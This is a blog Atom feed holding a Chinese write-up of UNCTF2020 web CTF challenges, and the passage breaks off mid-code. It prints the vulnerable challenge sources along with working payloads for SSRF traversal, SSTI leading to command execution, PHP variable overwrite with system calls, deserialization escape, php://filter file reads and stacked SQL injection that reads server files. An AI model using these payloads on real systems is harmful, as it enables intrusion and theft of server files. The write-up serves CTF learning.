<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Str3am&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jlkl.github.io/"/>
  <updated>2020-11-19T02:14:16.572Z</updated>
  <id>https://jlkl.github.io/</id>
  
  <author>
    <name>Str3am</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UNCTF2020 WriteUp</title>
    <link href="https://jlkl.github.io/2020/11/19/Web_17/"/>
    <id>https://jlkl.github.io/2020/11/19/Web_17/</id>
    <published>2020-11-19T02:07:56.000Z</published>
    <updated>2020-11-19T02:14:16.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>url里只要包含 <code>unctf.com</code> 即可，开始想多了，弄到 gopher 协议了，然后发现 <code>dict</code> 和 <code>gopher</code> 协议根本没开启，手慢错失三血</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>e035ba36-<span class="number">6</span>bf8-<span class="number">44</span>c8-<span class="number">9837</span>-<span class="number">2</span>afecc32ca08.node3.hackingfor.fun<span class="regexp">/?url=/u</span>nctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p><strong>知识点</strong></p><ul><li>SSTI</li><li>bypass <code>__</code></li></ul><p>注册 admin 然后登陆，发现路径 <code>secret_route_you_do_not_know</code>，<code>guss</code> 参数 SSTI</p><p><code>__</code> 被过滤，网上找了下，发现这篇文章：</p><p><a href="https://www.secpulse.com/archives/115367.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/115367.html</a></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.<span class="keyword">x</span><span class="number">1</span>)|attr(request.args.<span class="keyword">x</span><span class="number">2</span>)|attr(request.args.<span class="keyword">x</span><span class="number">3</span>)()|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(<span class="number">91</span>)|attr(request.args.<span class="keyword">x</span><span class="number">5</span>)|attr(request.args.<span class="keyword">x</span><span class="number">6</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">7</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">8</span>)(request.args.<span class="keyword">x</span><span class="number">9</span>)&#125;&#125;&amp;<span class="keyword">x</span><span class="number">1</span>=__class__&amp;<span class="keyword">x</span><span class="number">2</span>=__base__&amp;<span class="keyword">x</span><span class="number">3</span>=__subclasses__&amp;<span class="keyword">x</span><span class="number">4</span>=__getitem__&amp;<span class="keyword">x</span><span class="number">5</span>=__init__&amp;<span class="keyword">x</span><span class="number">6</span>=__globals__&amp;<span class="keyword">x</span><span class="number">7</span>=__builtins__&amp;<span class="keyword">x</span><span class="number">8</span>=eval&amp;<span class="keyword">x</span><span class="number">9</span>=__import__('platform').popen('cat flag.txt').read()</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p><strong>知识点</strong></p><ul><li>变量覆盖</li><li>0e 开头 sha1 爆破</li><li>PHP 复杂变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getVars</code> 函数逻辑使用 <code>$$var</code> 可变量覆盖，<code>md5($password) === $adminPassword</code> 值需要覆盖 <code>adminPassword</code> 值为任意已知原文的md5值即可。<code>sha1($verif) == $verif</code> 这一步采用 <code>0e</code> 相等的方式，附上爆破脚本，爆破了大概半小时……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;;$i++)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"0e&#123;$i&#125;"</span>==sha1(<span class="string">"0e&#123;$i&#125;"</span>))</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"[+] found! 0e&#123;$i&#125;"</span>); </span><br><span class="line">    <span class="keyword">elseif</span> ($i % <span class="number">1000000</span> === <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+] current value: &#123;$i&#125;\n"</span>;</span><br></pre></td></tr></table></figure><p>payload，然后直接在 phpinfo 页面可以看到 flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">password</span>=123456&amp;verif=0e1290633704&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e&amp;var1=$&#123;<span class="variable">$a</span>()&#125;&amp;<span class="attribute">a</span>=phpinfo</span><br></pre></td></tr></table></figure><p>上面这个 payload 命令命令执行的话，因为位数限制，执行的命令有限制，这题还可以任意命令执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">password</span>=123456&amp;verif=0e1290633704&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e&amp;var1=$&#123;<span class="variable">$a</span>(<span class="variable">$b</span>)&#125;&amp;<span class="attribute">a</span>=system&amp;b=whoami</span><br></pre></td></tr></table></figure><p>非预期：</p><p>动态函数，刚好 flag 也可以在 phpinfo 看到</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=<span class="number">123456</span><span class="variable">&amp;verif</span>=<span class="number">0e1290633704</span><span class="variable">&amp;</span>adminPassword=e10adc3949ba59abbe56e057f20f883e<span class="variable">&amp;var1</span>=\<span class="string">"$a()?&gt;&amp;a=phpinfo</span></span><br></pre></td></tr></table></figure><h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><ul><li>反序列化逃逸</li><li>逃逸长度增加或减少</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化字符串逃逸，可以看这篇文章，增加和减少都有讲到</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p>需要注意增加或减少逃逸长度的思想，正常的 payload <code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;}</code>，长度为 29，然而每次逃逸的长度为 4，29 不是 4 的倍数。减少是不可能了，那么考虑增加，<code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;i:1}</code> 32 位，是 4 的倍数。</p><p>payload：<code>challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;i:1}</code></p><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><p>正则为 <code>/\(.*\)/</code>，不能使用带括号的 PHP 函数，那么考虑特殊语法 echo 和 include，回显结果不能含有 <code>flag</code>，base64 即可</p><p>payload1：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=echo`cat flag.php|base64`;</span><br></pre></td></tr></table></figure><p> payload2：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?a</span>=<span class="keyword">include</span> <span class="string">'php://filter/read=convert.base64-encode/resource=flag.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化数组即可，本地 payload 可以，题目环境不可以，发现 <code>==</code> 想到弱类型，flag.php 里面对变量肯定有改动，<code>username</code> 和 <code>password</code> 改为数字类型的 <code>0</code> 即可，（非得这么考弱类型吗……）</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">a:</span><span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"username"</span>;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;<span class="string">i:</span><span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><p>给了 index.php，登录 post 请求要改到 check.php，然后会跳转到 ping.php，然后都是假界面，index.php 注入然后 os-shell 搞定。</p><p>后面发现改了题，换成了命令执行绕过，过滤了空格，用 <code>%09</code> 绕过。又过滤了 <code>flag</code>，使用linux 通配符 <code>/????</code> 的方式 cat 到 flag</p><h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><p>qwb 随便注改编，三种思路可以参考</p><p><a href="https://www.jianshu.com/p/36f0772f5ce8" target="_blank" rel="noopener">https://www.jianshu.com/p/36f0772f5ce8</a></p><p>这里 <code>set..prepare</code> 过滤忽略了大小写，set 和 prepare 不能同时出现，那么换一种思路，使用系统变量。数据库没有东西，尝试写入shell，能写入，但是访问就403错误，猜测 ngnix 配置问题。然后尝试 load_file 读文件，读取到 <code>/tmp/flag.sh</code> 获取到 flag 路径（参照随便注的 dockerfile）为 <code>/fffllaagg</code>，读取即可。</p><p>这里有一个小 trick，我是使用的系统变量 <code>general_log_file</code> 来注入，但是发现 <code>select ... /etc/paswd</code> 这样sql语句和目录一起出现的语句不能赋值给 <code>general_log_file</code>，所以我用了两个系统变量，用预编译占位符的方式绕过。</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1';<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">"select load_file(?)"</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">"/fffllaagg"</span>;<span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"slow_query_log_file"</span>;<span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"general_log_file"</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @@slow_query_log_file;<span class="keyword">execute</span> execsql <span class="keyword">using</span> @@general_log_file;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>后来发现预期解是考察存储过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"1';</span></span><br><span class="line"><span class="string">    create procedure `qq`(out string text(1024), in hex text(1024))</span></span><br><span class="line"><span class="string">    BEGIN</span></span><br><span class="line"><span class="string">        SET string = hex;</span></span><br><span class="line"><span class="string">    END;</span></span><br><span class="line"><span class="string">    ;#"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($a).<span class="string">"\n"</span>;</span><br><span class="line">$b = <span class="string">"1';</span></span><br><span class="line"><span class="string">    call `qq`(@decoded, 0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460);</span></span><br><span class="line"><span class="string">    prepare payload from @decoded;</span></span><br><span class="line"><span class="string">    execute payload;</span></span><br><span class="line"><span class="string">    ;#"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT language=javascript&gt;&lt;!--</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runClock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">theTime = window.setTimeout(<span class="string">"runClock()"</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> Date();</span><br><span class="line"><span class="keyword">var</span> display= today.toLocaleString();</span><br><span class="line">window.status=<span class="string">""</span>+display+<span class="string">"黑客导航 － www.hac-ker.com"</span>;</span><br><span class="line">&#125;runClock();</span><br><span class="line"><span class="comment">//--&gt;</span></span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="footer-wrapper"&gt;</span><br><span class="line">            &lt;footer&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    error_reporting(<span class="number">0</span>);</span><br><span class="line">                    $action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">                            &#125;                           </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/footer&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- B4Z0-@:OCnDf, --&gt;</span><br></pre></td></tr></table></figure><p>fuzz 到 action 参数，发现文件包含漏洞，filter 伪协议读源码即可，过滤了 base，换用rot13编码</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="keyword">string</span>.rot13/resource=flag.php</span><br></pre></td></tr></table></figure><p>flag.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hex 解码后发现 1nD3x.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span 